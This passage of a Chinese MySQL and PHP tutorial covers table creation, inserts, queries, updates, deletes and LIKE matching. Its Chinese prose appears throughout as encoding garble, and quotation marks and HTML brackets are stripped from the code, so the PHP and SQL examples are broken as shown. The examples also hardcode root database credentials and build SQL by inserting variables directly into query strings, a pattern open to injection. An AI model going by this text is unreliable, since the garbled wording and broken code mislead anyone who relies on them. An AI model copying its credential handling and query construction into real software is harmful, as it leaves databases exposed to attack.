å¿…éœ€ï¼Œè§„å®šè¦ä½¿ç”¨çš„é»˜è®¤æ•°æ®åº“ã€‚ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));echo è¿æ¥æˆåŠŸ;mysqli_select_db($conn, RUNOOB );mysqli_close($conn);? MySQL æ•°æ®ç±»å‹ è¯¦è§ æ•°å€¼ç±»å‹ æ•´æ•°ç±»å‹ TINYINT ï¼šå­˜å‚¨å¹´é¾„ã€æ•°é‡ INT æˆ– BIGINTï¼šä¸»é”®æˆ–ç”¨æˆ·ID å°æ•°ç±»å‹ DECIMALï¼šéœ€è¦ç²¾ç¡®å­˜å‚¨çš„å°æ•°ï¼Œä¾‹å¦‚è´§å¸é‡‘é¢ FLOATæˆ–DOUBLEï¼šéœ€è¦è¿‘ä¼¼å­˜å‚¨çš„å°æ•°ï¼Œä¾‹å¦‚ç§‘å­¦è®¡ç®—ç»“æœ æ—¥æœŸå’Œæ—¶é—´ç±»å‹ DATEï¼šä»…å­˜å‚¨æ—¥æœŸ DATETIMEï¼šå­˜å‚¨æ—¥æœŸå’Œæ—¶é—´ï¼Œä¾‹å¦‚ç”¨æˆ·æ³¨å†Œæ—¶é—´ TIMESTAMPï¼šå¸¦æœ‰æ—¶åŒºçš„æ—¥æœŸæ—¶é—´ï¼ˆè‡ªåŠ¨æ›´æ–°ï¼‰ï¼Œä¾‹å¦‚æ—¥å¿—è®°å½•æ—¶é—´ TIMEï¼šå­˜å‚¨æ—¶é—´éƒ¨åˆ† å­—ç¬¦ä¸²ç±»å‹ CHARï¼šæ•°æ®é•¿åº¦å›ºå®šï¼Œä¾‹å¦‚å­˜å‚¨å›ºå®šé•¿åº¦çš„ç¼–ç  VARCHARï¼šæ•°æ®é•¿åº¦ä¸å›ºå®šï¼Œä¾‹å¦‚å­˜å‚¨ç”¨æˆ·åã€é‚®ç®±åœ°å€ TEXTæˆ–BLOBï¼šéœ€è¦å­˜å‚¨å¤§æ–‡æœ¬æˆ–äºŒè¿›åˆ¶æ•°æ®æ—¶ï¼Œä¾‹å¦‚æ–‡ç« å†…å®¹å­˜å‚¨åœ¨ TEXT ä¸­ï¼Œå›¾ç‰‡å­˜å‚¨åœ¨ BLOB ä¸­ æšä¸¾ä¸é›†åˆç±»å‹ ENUM æˆ– TINYINT ï¼šæœ‰é™çš„æšä¸¾æ•°æ®ï¼ˆå¦‚çŠ¶æ€å€¼ active/inactiveï¼‰ ç©ºé—´æ•°æ®ç±»å‹ MySQL åˆ›å»ºæ•°æ®è¡¨ CREATE TABLE table_name ( column1 datatype, column2 datatype, ...); table_name æ˜¯è¦åˆ›å»ºçš„è¡¨çš„åç§°ã€‚ column1, column2, â€¦ æ˜¯è¡¨ä¸­çš„åˆ—åã€‚ datatype æ˜¯æ¯ä¸ªåˆ—çš„æ•°æ®ç±»å‹ã€‚ CREATE TABLE users ( id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50) NOT NULL, email VARCHAR(100) NOT NULL, birthdate DATE, is_active BOOLEAN DEFAULT TRUE); AUTO_INCREMENT å…³é”®å­—ç”¨äºåˆ›å»ºä¸€ä¸ªè‡ªå¢é•¿çš„åˆ—ï¼Œæ•°å€¼ä¼šè‡ªåŠ¨åŠ  1 PRIMARY KEY ç”¨äºå®šä¹‰ä¸»é”®ï¼ˆæ˜¯ç”¨æ¥å”¯ä¸€æ ‡è¯†æ•°æ®åº“è¡¨ä¸­æ¯ä¸€æ¡è®°å½•çš„å­—æ®µï¼ˆæˆ–å­—æ®µç»„åˆï¼‰ï¼‰ NOT NULLä¸å…è®¸ä¸ºç©º å¦‚æœå¸Œæœ›åœ¨åˆ›å»ºè¡¨æ—¶æŒ‡å®šæ•°æ®å¼•æ“ï¼Œå­—ç¬¦é›†å’Œæ’åºè§„åˆ™ç­‰ï¼Œå¯ä»¥ä½¿ç”¨ CHARACTER SET å’Œ COLLATE å­å¥ CREATE TABLE mytable ( id INT PRIMARY KEY, name VARCHAR(50)) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci; ä»¥ä¸‹ä¾‹å­ä¸­æˆ‘ä»¬å°†åœ¨ RUNOOB æ•°æ®åº“ä¸­åˆ›å»ºæ•°æ®è¡¨ runoob_tblï¼š CREATE TABLE IF NOT EXISTS `runoob_tbl`( `runoob_id` INT UNSIGNED AUTO_INCREMENT, `runoob_title` VARCHAR(100) NOT NULL, `runoob_author` VARCHAR(40) NOT NULL, `submission_date` DATE, PRIMARY KEY ( `runoob_id` ))ENGINE=InnoDB DEFAULT CHARSET=utf8; ENGINE è®¾ç½®å­˜å‚¨å¼•æ“ï¼ŒCHARSET è®¾ç½®ç¼–ç  root@host# mysql -u root -pEnter password:****mysql USE RUNOOB;DATABASE changedmysql CREATE TABLE runoob_tbl( - runoob_id INT NOT NULL AUTO_INCREMENT, - runoob_title VARCHAR(100) NOT NULL, - runoob_author VARCHAR(40) NOT NULL, - submission_date DATE, - PRIMARY KEY ( runoob_id ) - )ENGINE=InnoDB DEFAULT CHARSET=utf8;Query OK, 0 ROWS affected (0.16 sec)mysql MySQL å‘½ä»¤ç»ˆæ­¢ç¬¦ä¸ºåˆ†å· ; - æ˜¯æ¢è¡Œç¬¦æ ‡è¯† ä½¿ç”¨ PHP è„šæœ¬åˆ›å»ºæ•°æ®è¡¨ ä½¿ç”¨ PHP çš„ mysqli_query() å‡½æ•°æ¥åˆ›å»ºå·²å­˜åœ¨æ•°æ®åº“çš„æ•°æ®è¡¨ mysqli_query(connection,query,resultmode); å‚æ•° æè¿° connection å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„ MySQL è¿æ¥ã€‚ query å¿…éœ€ï¼Œè§„å®šæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ resultmode å¯é€‰ã€‚ä¸€ä¸ªå¸¸é‡ã€‚å¯ä»¥æ˜¯ä¸‹åˆ—å€¼ä¸­çš„ä»»æ„ä¸€ä¸ªï¼šMYSQLI_USE_RESULTï¼ˆå¦‚æœéœ€è¦æ£€ç´¢å¤§é‡æ•°æ®ï¼Œè¯·ä½¿ç”¨è¿™ä¸ªï¼‰MYSQLI_STORE_RESULTï¼ˆé»˜è®¤ï¼‰ ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));echo è¿æ¥æˆåŠŸbr /;$sql = CREATE TABLE runoob_tbl( . runoob_id INT NOT NULL AUTO_INCREMENT, . runoob_title VARCHAR(100) NOT NULL, . runoob_author VARCHAR(40) NOT NULL, . submission_date DATE, . PRIMARY KEY ( runoob_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8; ;mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ•°æ®è¡¨åˆ›å»ºå¤±è´¥: . mysqli_error($conn));echo æ•°æ®è¡¨åˆ›å»ºæˆåŠŸ ;mysqli_close($conn);? é€šè¿‡å‘½ä»¤è¡ŒæŸ¥çœ‹è¡¨ç»“æ„ show tables; desc runoob_tbl; MySQL åˆ é™¤æ•°æ®è¡¨ é€šè¿‡å‘½ä»¤æç¤ºç¬¦åˆ é™¤æ•°æ®è¡¨ DROP TABLE table_name; -- ç›´æ¥åˆ é™¤è¡¨ï¼Œä¸æ£€æŸ¥æ˜¯å¦å­˜åœ¨ DROP TABLE [IF EXISTS] table_name; -- ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™åˆ é™¤ å¦‚æœåªæ˜¯æƒ³åˆ é™¤è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œä½†ä¿ç•™è¡¨çš„ç»“æ„ï¼Œå¯ä»¥ä½¿ç”¨ TRUNCATE TABLE è¯­å¥ï¼š TRUNCATE TABLE table_name; ä½¿ç”¨ PHP è„šæœ¬åˆ é™¤æ•°æ®è¡¨ mysqli_query(connection,query,resultmode); ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));echo è¿æ¥æˆåŠŸbr /;$sql = DROP TABLE runoob_tbl;mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ•°æ®è¡¨åˆ é™¤å¤±è´¥: . mysqli_error($conn));echo æ•°æ®è¡¨åˆ é™¤æˆåŠŸ ;mysqli_close($conn);? MySQL æ’å…¥æ•°æ® MySQL è¡¨ä¸­ä½¿ç”¨ INSERT INTOè¯­å¥æ¥æ’å…¥æ•°æ® INSERT INTO table_name (column1, column2, column3, ...)VALUES (value1, value2, value3, ...); table_name æ˜¯ä½ è¦æ’å…¥æ•°æ®çš„è¡¨çš„åç§°ã€‚ column1, column2, column3, â€¦ æ˜¯è¡¨ä¸­çš„åˆ—åã€‚ value1, value2, value3, â€¦ æ˜¯è¦æ’å…¥çš„å…·ä½“æ•°å€¼(å¦‚æœæ•°æ®æ˜¯å­—ç¬¦å‹ï¼Œå¿…é¡»ä½¿ç”¨å•å¼•å· â€™ æˆ–è€…åŒå¼•å· ) å¦‚æœè¦æ’å…¥æ‰€æœ‰åˆ—çš„æ•°æ®ï¼Œå¯ä»¥çœç•¥åˆ—åï¼š INSERT INTO usersVALUES (NULL,test, test@runoob.com, 1990-01-01, true); è¿™é‡Œï¼ŒNULL æ˜¯ç”¨äºè‡ªå¢é•¿åˆ—çš„å ä½ç¬¦ï¼Œè¡¨ç¤ºç³»ç»Ÿå°†ä¸º id åˆ—ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„å€¼ å¦‚æœä½ è¦æ’å…¥å¤šè¡Œæ•°æ®ï¼Œå¯ä»¥åœ¨ VALUES å­å¥ä¸­æŒ‡å®šå¤šç»„æ•°å€¼ï¼š INSERT INTO users (username, email, birthdate, is_active)VALUES (test1, test1@runoob.com, 1985-07-10, true), (test2, test2@runoob.com, 1988-11-25, false), (test3, test3@runoob.com, 1993-05-03, true); é€šè¿‡å‘½ä»¤æç¤ºçª—å£æ’å…¥æ•°æ® root@host# mysql -u root -p password;Enter password:*******mysql USE RUNOOB;DATABASE changedmysql INSERT INTO runoob_tbl - (runoob_title, runoob_author, submission_date) - VALUES - (å­¦ä¹  PHP, èœé¸Ÿæ•™ç¨‹, NOW());Query OK, 1 ROWS affected, 1 warnings (0.01 sec)mysql INSERT INTO runoob_tbl - (runoob_title, runoob_author, submission_date) - VALUES - (å­¦ä¹  MySQL, èœé¸Ÿæ•™ç¨‹, NOW());Query OK, 1 ROWS affected, 1 warnings (0.01 sec)mysql INSERT INTO runoob_tbl - (runoob_title, runoob_author, submission_date) - VALUES - (JAVA æ•™ç¨‹, RUNOOB.COM, 2016-05-06);Query OK, 1 ROWS affected (0.00 sec)mysql å®ä¾‹ä¸­ NOW() æ˜¯ä¸€ä¸ª MySQL å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›æ—¥æœŸå’Œæ—¶é—´ æŸ¥çœ‹æ•°æ®è¡¨æ•°æ®ï¼š select * from runoob_tbl; ä½¿ç”¨ PHP è„šæœ¬æ’å…¥æ•°æ® mysqli_query(connection,query,resultmode); ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));echo è¿æ¥æˆåŠŸbr /;// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $runoob_title = å­¦ä¹  Python;$runoob_author = RUNOOB.COM;$submission_date = 2016-03-06; $sql = INSERT INTO runoob_tbl . (runoob_title,runoob_author, submission_date) . VALUES . ($runoob_title,$runoob_author,$submission_date); mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•æ’å…¥æ•°æ®: . mysqli_error($conn));echo æ•°æ®æ’å…¥æˆåŠŸ ;mysqli_close($conn);? å¯¹äºå«æœ‰ä¸­æ–‡çš„æ•°æ®æ’å…¥ï¼Œéœ€è¦æ·»åŠ  mysqli_query($conn , â€œset names utf8â€); è¯­å¥ MySQL æŸ¥è¯¢æ•°æ® MySQL æ•°æ®åº“ä½¿ç”¨ SELECT è¯­å¥æ¥æŸ¥è¯¢æ•°æ® SELECT column1, column2, ...FROM table_name[WHERE condition][ORDER BY column_name [ASC | DESC]][LIMIT number]; column1, column2, â€¦ æ˜¯ä½ æƒ³è¦é€‰æ‹©çš„åˆ—çš„åç§°ï¼Œå¦‚æœä½¿ç”¨ * è¡¨ç¤ºé€‰æ‹©æ‰€æœ‰åˆ—ã€‚ table_name æ˜¯ä½ è¦ä»ä¸­æŸ¥è¯¢æ•°æ®çš„è¡¨çš„åç§°ã€‚ WHERE condition æ˜¯ä¸€ä¸ªå¯é€‰çš„å­å¥ï¼Œç”¨äºæŒ‡å®šè¿‡æ»¤æ¡ä»¶ï¼Œåªè¿”å›ç¬¦åˆæ¡ä»¶çš„è¡Œã€‚ ORDER BY column_name [ASC | DESC] æ˜¯ä¸€ä¸ªå¯é€‰çš„å­å¥ï¼Œç”¨äºæŒ‡å®šç»“æœé›†çš„æ’åºé¡ºåºï¼Œé»˜è®¤æ˜¯å‡åºï¼ˆASCï¼‰ã€‚ LIMIT number æ˜¯ä¸€ä¸ªå¯é€‰çš„å­å¥ï¼Œç”¨äºé™åˆ¶è¿”å›çš„è¡Œæ•° -- é€‰æ‹©æ‰€æœ‰åˆ—çš„æ‰€æœ‰è¡ŒSELECT * FROM users;-- é€‰æ‹©ç‰¹å®šåˆ—çš„æ‰€æœ‰è¡ŒSELECT username, email FROM users;-- æ·»åŠ  WHERE å­å¥ï¼Œé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„è¡ŒSELECT * FROM users WHERE is_active = TRUE;-- æ·»åŠ  ORDER BY å­å¥ï¼ŒæŒ‰ç…§æŸåˆ—çš„å‡åºæ’åºSELECT * FROM users ORDER BY birthdate;-- æ·»åŠ  ORDER BY å­å¥ï¼ŒæŒ‰ç…§æŸåˆ—çš„é™åºæ’åºSELECT * FROM users ORDER BY birthdate DESC;-- æ·»åŠ  LIMIT å­å¥ï¼Œé™åˆ¶è¿”å›çš„è¡Œæ•°SELECT * FROM users LIMIT 10; é€šè¿‡å‘½ä»¤æç¤ºç¬¦è·å–æ•°æ® select * from runoob_tbl; ä½¿ç”¨ PHP è„šæœ¬æ¥è·å–æ•°æ® ä½¿ç”¨ PHP å‡½æ•°çš„ mysqli_query() åŠ SQL SELECT å‘½ä»¤æ¥è·å–æ•°æ®ã€‚è¯¥å‡½æ•°ç”¨äºæ‰§è¡Œ SQL å‘½ä»¤ï¼Œç„¶åé€šè¿‡ PHP å‡½æ•° mysqli_fetch_array() æ¥ä½¿ç”¨æˆ–è¾“å‡ºæ‰€æœ‰æŸ¥è¯¢çš„æ•°æ® ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•è¯»å–æ•°æ®: . mysqli_error($conn));echo h2èœé¸Ÿæ•™ç¨‹ mysqli_fetch_array æµ‹è¯•/h2;echo table border=1trtdæ•™ç¨‹ ID/tdtdæ ‡é¢˜/tdtdä½œè€…/tdtdæäº¤æ—¥æœŸ/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;/*while($row = mysqli_fetch_array($retval, MYSQLI_NUM)) echo trtd $row[0]/td . td$row[1] /td . td$row[2] /td . td$row[3] /td . /tr;*/echo /table;// é‡Šæ”¾å†…å­˜mysqli_free_result($retval);mysqli_close($conn);? [!IMPORTANT] mysqli_fetch_array($result, $result_type); $resultï¼šå¿…éœ€ï¼Œè¡¨ç¤ºæŸ¥è¯¢çš„ç»“æœé›†ã€‚é€šå¸¸æ˜¯é€šè¿‡ mysqli_query() æ‰§è¡ŒæŸ¥è¯¢åå¾—åˆ°çš„ã€‚ $result_typeï¼šå¯é€‰ï¼ŒæŒ‡å®šè¿”å›çš„æ•°ç»„ç±»å‹ï¼Œå¯ä»¥æ˜¯ä»¥ä¸‹å€¼ï¼š MYSQLI_ASSOCï¼šè¿”å›å…³è”æ•°ç»„ï¼Œåˆ—åä½œä¸ºé”®ã€‚ MYSQLI_NUMï¼šè¿”å›æ•°å­—æ•°ç»„ï¼Œåˆ—çš„ç´¢å¼•ä½œä¸ºé”®ã€‚ æ‰§è¡Œå®Œ SELECT è¯­å¥åï¼Œé€šè¿‡ PHP å‡½æ•° mysqli_free_result() æ¥å®ç°å†…å­˜çš„é‡Šæ”¾ MySQL WHERE å­å¥ å°† WHERE å­å¥æ·»åŠ åˆ° SELECT è¯­å¥ä¸­å¯ä»¥æœ‰æ¡ä»¶åœ°ä»è¡¨ä¸­é€‰å–æ•°æ®ï¼ˆè¿‡æ»¤æŸ¥è¯¢ç»“æœï¼‰ï¼Œåªè¿”å›æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„è¡Œ SELECT column1, column2, ...FROM table_nameWHERE condition; column1, column2, â€¦ æ˜¯ä½ è¦é€‰æ‹©çš„åˆ—çš„åç§°ï¼Œå¦‚æœä½¿ç”¨ * è¡¨ç¤ºé€‰æ‹©æ‰€æœ‰åˆ—ã€‚ table_name æ˜¯ä½ è¦ä»ä¸­æŸ¥è¯¢æ•°æ®çš„è¡¨çš„åç§°ã€‚ WHERE condition æ˜¯ç”¨äºæŒ‡å®šè¿‡æ»¤æ¡ä»¶çš„å­å¥ã€‚ [!TIP] æŸ¥è¯¢è¯­å¥ä¸­ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªè¡¨ï¼Œè¡¨ä¹‹é—´ä½¿ç”¨é€—å·**,** åˆ†å‰²ï¼Œå¹¶ä½¿ç”¨WHEREè¯­å¥æ¥è®¾å®šæŸ¥è¯¢æ¡ä»¶ã€‚ ä½ å¯ä»¥åœ¨ WHERE å­å¥ä¸­æŒ‡å®šä»»ä½•æ¡ä»¶ã€‚ ä½ å¯ä»¥ä½¿ç”¨ AND æˆ–è€… OR æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªæ¡ä»¶ã€‚ WHERE å­å¥ä¹Ÿå¯ä»¥è¿ç”¨äº SQL çš„ DELETE æˆ–è€… UPDATE å‘½ä»¤ã€‚ WHERE å­å¥ç±»ä¼¼äºç¨‹åºè¯­è¨€ä¸­çš„ if æ¡ä»¶ï¼Œæ ¹æ® MySQL è¡¨ä¸­çš„å­—æ®µå€¼æ¥è¯»å–æŒ‡å®šçš„æ•°æ®ã€‚ ç»„åˆæ¡ä»¶ï¼ˆANDã€ORï¼‰: SELECT * FROM products WHERE category = Electronics AND price 100.00;SELECT * FROM orders WHERE order_date = 2023-01-01 OR total_amount 1000.00; æ¨¡ç³ŠåŒ¹é…æ¡ä»¶ï¼ˆLIKEï¼‰: SELECT * FROM customers WHERE first_name LIKE J%; IN æ¡ä»¶: SELECT * FROM countries WHERE country_code IN (US, CA, MX); NOT æ¡ä»¶: SELECT * FROM products WHERE NOT category = Clothing; BETWEEN æ¡ä»¶: SELECT * FROM orders WHERE order_date BETWEEN 2023-01-01 AND 2023-12-31; ä»å‘½ä»¤æç¤ºç¬¦ä¸­è¯»å–æ•°æ® SELECT * from runoob_tbl WHERE runoob_author=èœé¸Ÿæ•™ç¨‹; MySQL çš„ WHERE å­å¥çš„å­—ç¬¦ä¸²æ¯”è¾ƒæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚ ä½ å¯ä»¥ä½¿ç”¨ BINARY å…³é”®å­—æ¥è®¾å®š WHERE å­å¥çš„å­—ç¬¦ä¸²æ¯”è¾ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„ SELECT * from runoob_tbl WHERE BINARY runoob_author=runoob.com; ä½¿ç”¨ PHP è„šæœ¬è¯»å–æ•°æ® ä»¥ä¸‹å®ä¾‹å°†ä» runoob_tbl è¡¨ä¸­è¿”å›ä½¿ç”¨ runoob_author å­—æ®µå€¼ä¸º RUNOOB.COM çš„è®°å½•ï¼š ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); // è¯»å– runoob_author ä¸º RUNOOB.COM çš„æ•°æ®$sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl WHERE runoob_author=RUNOOB.COM; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•è¯»å–æ•°æ®: . mysqli_error($conn));echo h2èœé¸Ÿæ•™ç¨‹ MySQL WHERE å­å¥æµ‹è¯•h2;echo table border=1trtdæ•™ç¨‹ ID/tdtdæ ‡é¢˜/tdtdä½œè€…/tdtdæäº¤æ—¥æœŸ/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;echo /table;// é‡Šæ”¾å†…å­˜mysqli_free_result($retval);mysqli_close($conn);? MySQL UPDATE æ›´æ–° ä½¿ç”¨ UPDATE å‘½ä»¤ä¿®æ”¹æˆ–æ›´æ–° MySQL ä¸­çš„æ•°æ® UPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition; table_name æ˜¯ä½ è¦æ›´æ–°æ•°æ®çš„è¡¨çš„åç§°ã€‚ column1, column2, â€¦ æ˜¯ä½ è¦æ›´æ–°çš„åˆ—çš„åç§°ã€‚ value1, value2, â€¦ æ˜¯æ–°çš„å€¼ï¼Œç”¨äºæ›¿æ¢æ—§çš„å€¼ã€‚ WHERE condition æ˜¯ä¸€ä¸ªå¯é€‰çš„å­å¥ï¼Œç”¨äºæŒ‡å®šæ›´æ–°çš„è¡Œã€‚å¦‚æœçœç•¥ WHERE å­å¥ï¼Œå°†æ›´æ–°è¡¨ä¸­çš„æ‰€æœ‰è¡Œã€‚ é€šè¿‡å‘½ä»¤æç¤ºç¬¦æ›´æ–°æ•°æ® UPDATE runoob_tbl SET runoob_title=å­¦ä¹  C++ WHERE runoob_id=3; ä½¿ç”¨PHPè„šæœ¬æ›´æ–°æ•°æ® ä¸ä½¿ç”¨ WHERE å­å¥å°†ä¼šå¯¹æ•°æ®è¡¨çš„å…¨éƒ¨æ•°æ®è¿›è¡Œæ›´æ–° ä»¥ä¸‹å®ä¾‹å°†æ›´æ–° runoob_id ä¸º 3 çš„ runoob_title å­—æ®µçš„æ•°æ® ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $sql = UPDATE runoob_tbl SET runoob_title=å­¦ä¹  Python WHERE runoob_id=3; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•æ›´æ–°æ•°æ®: . mysqli_error($conn));echo æ•°æ®æ›´æ–°æˆåŠŸï¼;mysqli_close($conn);? MySQL DELETE è¯­å¥ ç”¨ DELETE FROM å‘½ä»¤æ¥åˆ é™¤ MySQL æ•°æ®è¡¨ä¸­çš„è®°å½• DELETE FROM table_nameWHERE condition; ä»å‘½ä»¤è¡Œä¸­åˆ é™¤æ•°æ® DELETE FROM runoob_tbl WHERE runoob_id=3; ä½¿ç”¨ PHP è„šæœ¬åˆ é™¤æ•°æ® ä»¥ä¸‹å®ä¾‹å°†åˆ é™¤ runoob_tbl è¡¨ä¸­ runoob_id ä¸º3 çš„è®°å½• ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = root; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $sql = DELETE FROM runoob_tbl WHERE runoob_id=3; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•åˆ é™¤æ•°æ®: . mysqli_error($conn));echo æ•°æ®åˆ é™¤æˆåŠŸï¼;mysqli_close($conn);? MySQL LIKE å­å¥ LIKE å­å¥æ˜¯åœ¨ MySQL ä¸­ç”¨äºåœ¨ WHERE å­å¥ä¸­è¿›è¡Œæ¨¡ç³ŠåŒ¹é…çš„å…³é”®å­—ã€‚å®ƒé€šå¸¸ä¸é€šé…ç¬¦ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºæœç´¢ç¬¦åˆæŸç§æ¨¡å¼çš„å­—ç¬¦ä¸² LIKE å­å¥ä¸­ä½¿ç”¨ç™¾åˆ†å· **%**å­—ç¬¦æ¥è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨ç™¾åˆ†å· %, LIKE å­å¥ä¸ç­‰å· = çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ % é€šé…ç¬¦è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€˜a%â€™ åŒ¹é…ä»¥å­—æ¯ â€˜aâ€™ å¼€å¤´çš„ä»»ä½•å­—ç¬¦ä¸² _ é€šé…ç¬¦è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€˜_r%â€™ åŒ¹é…ç¬¬äºŒä¸ªå­—æ¯ä¸º â€˜râ€™ çš„ä»»ä½•å­—ç¬¦ä¸² SELECT column1, column2, ...FROM table_nameWHERE column_name LIKE pattern; column1, column2, â€¦ æ˜¯ä½ è¦é€‰æ‹©çš„åˆ—çš„åç§°ï¼Œå¦‚æœä½¿ç”¨ * è¡¨ç¤ºé€‰æ‹©æ‰€æœ‰åˆ—ã€‚ table_name æ˜¯ä½ è¦ä»ä¸­æŸ¥è¯¢æ•°æ®çš„è¡¨çš„åç§°ã€‚ column_name æ˜¯ä½ è¦åº”ç”¨ LIKE å­å¥çš„åˆ—çš„åç§°ã€‚ pattern æ˜¯ç”¨äºåŒ¹é…çš„æ¨¡å¼ï¼Œå¯ä»¥åŒ…å«é€šé…ç¬¦ã€‚ åœ¨å‘½ä»¤æç¤ºç¬¦ä¸­ä½¿ç”¨ LIKE å­å¥ SELECT * from runoob_tbl WHERE runoob_author LIKE %COM; åœ¨ PHP è„šæœ¬ä¸­ä½¿ç”¨ LIKE å­å¥ ä»¥ä¸‹æ˜¯æˆ‘ä»¬ä½¿ç”¨PHPè„šæœ¬åœ¨ runoob_tbl è¡¨ä¸­è¯»å– runoob_author å­—æ®µä¸­ä»¥ COM ä¸ºç»“å°¾çš„çš„æ‰€æœ‰è®°å½• ?php$dbhost = localhost; // mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€$dbuser = root; // mysqlç”¨æˆ·å$dbpass = 123456; // mysqlç”¨æˆ·åå¯†ç $conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(è¿æ¥å¤±è´¥: . mysqli_error($conn));// è®¾ç½®ç¼–ç ï¼Œé˜²æ­¢ä¸­æ–‡ä¹±ç mysqli_query($conn , set names utf8); $sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl WHERE runoob_author LIKE %COM; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(æ— æ³•è¯»å–æ•°æ®: . mysqli_error($conn));echo h2èœé¸Ÿæ•™ç¨‹ mysqli_fetch_array æµ‹è¯•h2;echo table 